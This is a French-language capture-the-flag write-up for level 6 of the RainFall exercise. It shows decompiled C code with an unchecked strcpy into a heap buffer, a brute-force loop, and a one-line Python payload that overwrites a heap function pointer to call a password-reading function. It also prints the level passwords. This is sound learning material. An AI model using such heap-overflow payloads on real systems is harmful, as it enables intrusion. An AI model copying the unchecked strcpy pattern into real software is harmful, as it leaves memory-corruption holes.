# Level 6

pass : `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

## Source :

```c
#include <stdlib.h>

void	n() {  // 0x08048454
	system("/bin/cat /hom/user/level7/.pass");
}

void	m(char *str) {  // 0x08048468
	puts("Nope");
}

void	main(int ac, char **av) {  // 0x0804847c
	void *(*ptr_function)(char *);  // esp+0x18
	char *buf;  // esp+0x1c

	buf = malloc(64);
	ptr_function = malloc(4);
	ptr_function = &m;
	strcpy(buf, av[1]);
	(*ptr_function)(buf);
}
```

## Recherche :

> On va essayer de faire segfaut le programme jusqu'à ce que l'`EIP` soit remplacée par l'addresse de `n` (`0x08048454`)

### Malloc exploitation

On écrit un petite boucle :

```sh
for((i=64; i<80; i++)); do echo "index $i"; ./level6 `(perl -e 'print "A"x('$i')."\x54\x84\x04\x08"')` ;done
```

```sh
index 71
Segmentation fault (core dumped)
index 72
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
index 73
Segmentation fault (core dumped)
index 74
Segmentation fault (core dumped)
```

### Explication

En fait, ce qu'on fait ici est simple :

Malloc utilise une structure pour enregistrer nos informations alouées, pour un tronçon (chunk) aloué, on utiliser 4 bytes, 3 pour la taille allignée à 8, et le dernier pour le status (si le chunk est free ou non).

Même si l'on utilise seulement 4 bytes, la structure en prendra 8 pour être sûr de garder un allignement correct avec les pages de mémoire (memory pages).

![](https://www.win.tue.nl/~aeb/linux/hh/malloc.png)

Donc dans notre cas, on écrit au total 76 bytes :

- `64` pour le premier appel de `malloc()`

- `4` pour réécrire les information du chunk

- `4` autres pour réécrire le reste de la structure de malloc nécessaire pour l'alignement

- `4` pour remplir le second appel à `malloc()`, qui va être exécuté

  On arrive bien à notre offset de `72`.

## Exploit :

```shell
level6@RainFall:~$ ./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

L'`EIP` à bien été remplacé par notre valeur avec un offset de 72. Et on a trouvé le pass pour le level suivant : `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

## Documentation :

- [Heap execution exploitation](https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11.1)
